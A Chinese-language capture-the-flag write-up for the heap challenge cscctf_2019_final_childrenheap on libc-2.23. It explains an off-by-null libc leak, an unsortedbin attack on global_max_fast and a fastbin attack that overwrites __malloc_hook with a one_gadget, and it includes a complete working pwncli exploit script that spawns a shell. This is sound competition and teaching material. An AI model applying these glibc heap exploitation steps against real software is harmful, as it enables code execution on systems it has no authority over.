# cscctf_2019_final_childrenheap



### 总结

本题使用`malopt(1, 0)`禁用了`fastbin`，这种情况下，一般来说有两种解题思路：

- 方法一：首先`unsortedbin attack`攻击`global_max_fast`，然后利用`fastbin attack`完成利用
- 方法二：利用`largebin attack`或者有时候会利用`house of storm`进行任意地址分配

回到本题，由于申请的`chunk size`限制在了`0x10 ~ 0x100`之间，所以可以使用方法一，因此利用步骤为：

- `off by null` 泄露`libc`地址
- `unsortedbin attack`打`global_max_fast`
- `0x70`大小的`fastbin attack`，劫持`__malloc_hook`为`one_gadget`

<!-- more -->

### 题目分析

#### checksec

`libc`的版本为`libc-2.23.so`

![image-20211023151737952](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211023151737952.png)

#### 

#### 漏洞点

在`update`存在一个`off by null`：

![image-20211023151910512](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211023151910512.png)

### EXP

```python
#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']


def add(idx, size, data="deadbeef", is_attack=False):
    p.sendlineafter(">> ", "1")
    p.sendlineafter("Index: ", str(idx))
    p.sendlineafter("Size: ", str(size))
    if not is_attack:
        p.sendafter("Content: ", data)


def update(idx, data):
    p.sendlineafter(">> ", "2")
    p.sendlineafter("Index: ", str(idx))
    p.sendafter("Content: ", data)


def show(idx):
    p.sendlineafter(">> ", "3")
    p.sendlineafter("Index: ", str(idx))
    p.recvuntil("content: ")
    m = p.recvline(0)
    info(f"Get msg: {m}")
    return m


def dele(idx):
    p.sendlineafter(">> ", "4")
    p.sendlineafter("Index: ", str(idx))

"""procedure
1. off by null to leak
2. unsorted bin attack global_max_fast
2. fastbin attack
"""
add(0, 0x80)
add(1, 0xf8)
add(2, 0xf8)
add(3, 0xf0)
add(4, 0x10)

# off by null
dele(0) 
update(2, b"a"*0xf0 + p64(0x290))

# merge
dele(3)

# add
add(0, 0x80)

# leak 
m = show(1)
libc_base = u64_ex(m) - 0x3c4b78
log_libc_base_addr(libc_base)
libc.address = libc_base

# house of orange
add(3, 0x10)

global_max_fast_off = 0x3c67f8
payload = flat({
    0x18:[0x71, 0, libc_base + global_max_fast_off-0x10],
    0x80: [0, 0x21, 0, 0, 0, 0x21]
})
update(1, payload)

add(5, 0x60)

# get a fastbin chunk
dele(5)

payload = flat({
    0x18:[0x71, libc.sym['__malloc_hook']-0x23]
})
update(1, payload)

add(5, 0x60)

ags = get_current_one_gadget(libc_base)

add(6, 0x60, flat([0x13*"\x00", ags[2]]))

# trigger malloc_hook to get shell
dele(1)
dele(3)

get_flag_when_get_shell(p)

p.interactive()
```

效果如下：

![image-20211023152033748](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211023152033748.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://www.roderickchan.cn/zh-cn/2021-10-23-cscctf-2019-final-childrenheap/  

